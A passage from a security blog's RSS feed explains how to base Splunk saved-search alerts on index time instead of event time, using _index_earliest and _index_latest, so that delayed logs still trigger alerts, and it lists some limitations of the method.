<h3 class="anchored" data-anchor-id="a-solution">A Solution</h3>
<p>Rather than telling Splunk to alert to items within the last <code>_time</code> window for our searches, we can alert to anything indexed in the period since our search last ran. Instead saying, “Splunk tell me about any log you just discovered.”</p>
<p>To do this the alert requires two modifications:</p>
<ol type="1">
<li>Update the Alert Query</li>
<li>Update the Time Window</li>
</ol>
<section id="update-alert-query" class="level4">
<h4 class="anchored" data-anchor-id="update-alert-query">Update Alert Query</h4>
<p>Splunk can use time modifiers in the search query (<a href="https://docs.splunk.com/Documentation/SCS/current/Search/Timemodifiers">ref</a>). To switch to <code>_indextime</code> alerting we need to add <code>_index_earliest</code> and <code>_index_latest</code> to our search query. These parameters define the <code>_indextime</code> range we intend to search.</p>
<p><code>_index_earliest</code> - In most cases, set this to the time interval the alert looks back on. (e.g.&nbsp;<code>_index_earliest=-15m</code>)<br>
</p>
<p><code>_index_latest</code> - In most cases, this should be set to the current time. (e.g.&nbsp;<code>_index_latest=now()</code>)</p>
</section>
<section id="update-time-window" class="level4">
<h4 class="anchored" data-anchor-id="update-time-window">Update Time Window</h4>
<p>Switching to <code>_indextime</code> alerting will not remove the use of <code>_time</code>; it is still a filter on the search. Instead, <code>_time</code> is now the maximum log delay that still generates an alert.</p>
</section>
<section id="an-example" class="level4">
<h4 class="anchored" data-anchor-id="an-example">An Example</h4>
<p>The below search is updated to alert on <code>_indextime</code> alerting. The figure is marked relative to the behavior referenced in the list:</p>
<ol type="1">
<li>Search every 15 minutes</li>
<li>Search everything indexed within the last 15 minutes</li>
<li>Search everything with _time within the last 14 days*</li>
</ol>
<p>*This does not significantly impact processing; it is not the same as processing 14 days of data</p>
<p><img src="https://www.blue-prints.blog/content/blog/posts/splunk/splunk_blog_2.png" title="Fig 2. Example Updated Splunk Alert" class="img-fluid"> <em>Fig 2. Example Updated Splunk Alert</em></p>
<p>This alert behaves in the following manner: 1. Runs every 15 minutes 2. Searches logs indexed in the last 15 minutes 3. Searches logs delayed up to 14 days</p>
<p>Simply using <code>_time</code> can cause issues with saved searches, even in logs are delayed by minimal amounts. Switching to <code>_indextime</code> alerting reduces this problem significantly. In closing, I recommend running all saved searches with this method.*</p>
</section>
<section id="additional-items" class="level4">
<h4 class="anchored" data-anchor-id="additional-items">Additional Items</h4>
<p>This post did not address the following:</p>
<ul>
<li>This does not address or identify issues that set <code>_time</code> in the future. These should be identified separately and remediated.</li>
<li>Certain saved searches may require additional effort to adopt this method. For example: searches with subsearches, searches with multiple time frames, searches in which <code>_time</code> is a part of calculations or needs to be precise.</li>
<li>Switching to <code>_indextime</code> alerting is not a substitute for fixing unacceptable logging delay.</li>
</ul>


</section>
</section>

 ]]></description>
  <guid>https://www.blue-prints.blog/content/blog/posts/splunk/splunklogdelay.html</guid>
  <pubDate>Wed, 19 Apr 2023 04:00:00 GMT</pubDate>
</item>
</channel>
</rss>
